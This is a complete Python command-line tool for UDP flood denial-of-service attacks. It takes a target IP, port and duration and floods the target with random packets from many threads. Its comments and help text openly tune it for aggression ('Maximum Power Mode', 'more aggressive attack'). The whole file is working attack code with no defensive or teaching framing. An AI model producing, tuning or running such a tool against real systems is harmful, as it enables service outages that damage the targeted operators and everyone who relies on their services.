import socket
import random
import time
import sys
import threading
import multiprocessing
from argparse import ArgumentParser

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        # Smaller packet size for more packets
        self.packet_size = 1024  # Reduced from 65507 to send more packets
        self.duration = duration
        self.sent_packets = 0
        self.running = False
        # Increased thread count for more aggressive attack
        self.num_threads = multiprocessing.cpu_count() * 4  # Doubled thread count

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Increased socket buffer size
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB buffer
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Set socket to non-blocking mode
            sock.setblocking(0)
            return sock
        except socket.error as e:
            print("Error creating socket: {}".format(e))
            return None

    def generate_packet(self):
        return random._urandom(self.packet_size)

    def flood(self):
        sock = self.create_socket()
        if not sock:
            return

        self.running = True
        start_time = time.time()
        packets_per_second = 0
        last_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < self.duration:
                try:
                    # Send multiple packets in a loop without sleep
                    for _ in range(100):  # Send 100 packets per iteration
                        sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
                        self.sent_packets += 1
                        packets_per_second += 1
                    
                    # Calculate and display packets per second
                    current_time = time.time()
                    if current_time - last_time >= 1.0:
                        sys.stdout.write("\rPackets sent: {} | PPS: {} | Elapsed: {:.1f}s".format(
                            self.sent_packets, packets_per_second, current_time - start_time))
                        sys.stdout.flush()
                        packets_per_second = 0
                        last_time = current_time
                        
                except socket.error:
                    # Non-blocking socket will raise error when buffer is full
                    # Just continue sending
                    pass
        finally:
            sock.close()
            self.running = False

    def start(self):
        threads = []
        print("Starting attack with {} threads".format(self.num_threads))
        print("Using packet size: {} bytes".format(self.packet_size))
        print("Press Ctrl+C to stop")
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\nStopping flood...")
            self.running = False
            for thread in threads:
                thread.join()
        finally:
            print("\nTotal packets sent: {}".format(self.sent_packets))
            print("Average packets per second: {:.2f}".format(self.sent_packets / self.duration))

def main():
    parser = ArgumentParser(description="UDP Flooder Tool - Maximum Power Mode")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Attack duration in seconds")

    args = parser.parse_args()

    try:
        flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
        print("Starting UDP flood attack on {}:{}".format(args.target_ip, args.target_port))
        print("Duration: {} seconds".format(args.duration))
        flooder.start()
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print("Error: {}".format(e))

if __name__ == "__main__":
    main() 
